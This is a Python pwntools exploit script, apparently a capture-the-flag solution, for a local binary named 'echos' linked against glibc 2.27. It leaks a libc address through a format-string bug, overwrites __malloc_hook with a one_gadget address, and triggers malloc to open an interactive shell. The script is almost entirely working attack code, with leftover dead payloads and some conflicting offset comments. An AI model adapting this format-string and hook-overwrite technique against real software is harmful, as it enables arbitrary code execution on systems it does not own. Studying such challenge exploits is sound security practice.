from pwn import *
import sys

context.arch = 'amd64'
context.aslr = False
context.terminal = ['tmux','splitw','-h', '-p', '50']
context.log_level = 'debug'
elf = ELF('./echos')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
p = process('./echos',env={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'})

if(len(sys.argv) > 1):
    gdb.attach(p, '''
    b *0x555555554861
    b *0x555555554866
    ''')

p.sendline('%19$lx')
ret_main = int(p.recvline()[:-1].decode(),16)
libc.address = ret_main- 0x21b97#243 - libc.symbols["__libc_start_main"]
print(hex(libc.address))

'''0x2aaaaaddc38c'''
one_gadget = libc.address+0xe6ce9 #rsi == null rdx == null
one_gadget = libc.address+0x10a38c
malloc_hook = libc.address+0x3ebc30
print(hex(malloc_hook), 'to', hex(one_gadget))
# 0x1ebb70 is the offste for __malloc_hook
payload = ('%221c%13$hhn%49839c%12$hnddddddd')
payload += p64(malloc_hook)
payload += p64(malloc_hook+2)

payload = fmtstr_payload(8,{ malloc_hook:one_gadget&0xffffff},0,'byte')
p.sendline(payload.replace('lln','hhn'))
p.sendline("%65510c")
p.interactive()